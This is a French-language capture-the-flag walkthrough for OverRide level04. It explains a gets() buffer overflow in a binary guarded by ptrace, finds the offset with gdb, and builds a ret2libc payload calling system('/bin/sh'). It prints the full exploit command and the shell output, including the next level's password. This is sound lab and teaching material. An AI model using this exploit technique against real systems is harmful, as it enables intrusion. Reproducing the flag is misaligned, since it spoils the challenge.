@@ -1,0 +1,84 @@
+###############################################################################
+# WALKTHROUGH COMPLET - LEVEL04 (OverRide)                                    #
+###############################################################################
+
+1. ANALYSE DU BINAIRE ET LOGIQUE DE SÉCURITÉ
+--------------------------------------------
+Le binaire 'level04' utilise un mécanisme de surveillance Parent/Enfant :
+- Le Parent utilise 'ptrace()' pour surveiller les appels systèmes (syscalls) du Fils.
+- Le Parent bloque spécifiquement le syscall 11 (0xb), qui est 'execve'.
+- Si le Fils tente d'exécuter '/bin/sh' via un shellcode classique, le Parent
+  détecte 'execve', affiche "no exec() for you" et tue le processus.
+
+2. IDENTIFICATION DE LA FAILLE
+------------------------------
+Le processus Fils utilise la fonction 'gets()' pour remplir un buffer de 128 octets.
+'gets()' ne vérifie pas la taille de l'entrée, ce qui permet un Buffer Overflow.
+
+3. RECHERCHE DE L'OFFSET EXACT (MÉTHODE GDB)
+--------------------------------------------
+Pour trouver combien d'octets envoyer avant d'écraser l'adresse de retour (EIP),
+on utilise GDB en suivant le processus Fils :
+
+$ gdb ./level04
+(gdb) set follow-fork-mode child //comme nous somme dans un fork il faut follow l enfant car le parent sera suivi par default
+(gdb) run
+# Quand le programme affiche "Give me some shellcode, k", on injecte un pattern :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
+
+# Le programme crash.
+eip : 0x46464646 (soit "FFFF")
+
+# Calcul :
+# 140 (A) + 4 (B) + 4 (C) + 4 (D) + 4 (E) = 156 octets.
+# L'EIP commence à l'octet 157. L'offset est donc 156.
+
+4. RÉCUPÉRATION DES ADRESSES LIBC (RET2LIBC)
+--------------------------------------------
+On ne peut pas utiliser de shellcode à cause du ptrace. On utilise donc
+la technique Ret2Libc pour sauter dans la fonction 'system()' de la libc.
+
+Dans GDB :
+(gdb) break main
+(gdb) run
+
+# 1. Adresse de system()
+(gdb) p system
+$1 = 0xf7e6aed0
+
+# 2. Adresse de exit() (pour quitter proprement)
+(gdb) p exit
+$2 = 0xf7e5eb70
+
+# 3. Adresse de la chaîne "/bin/sh"
+(gdb) info proc mappings
+# On repère la plage de la libc : 0xf7e2c000 à 0xf7fcc000
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+$3 = 0xf7f897ec
+
+5. CONSTRUCTION DU PAYLOAD
+--------------------------
+Structure de la pile pour l'attaque :
+[Padding (156 octets)] + [ADDR system] + [ADDR exit] + [ADDR "/bin/sh"]
+
+Détails des adresses (Little Endian) :
+- system : \xd0\xae\xe6\xf7
+- exit   : \x70\xeb\xe5\xf7
+- /bin/sh: \xec\x97\xf8\xf7
+
+6. EXÉCUTION DE L'EXPLOIT
+-------------------------
+On utilise 'python' pour générer le payload et 'cat' avec un pipe pour
+maintenir l'entrée standard (stdin) ouverte une fois le shell lancé.
+
+COMMANDE FINALE :
+(python -c "import sys; sys.stdout.write('A'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; cat) | ./level04
+
+7. OBTENTION DU FLAG
+--------------------
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+###############################################################################
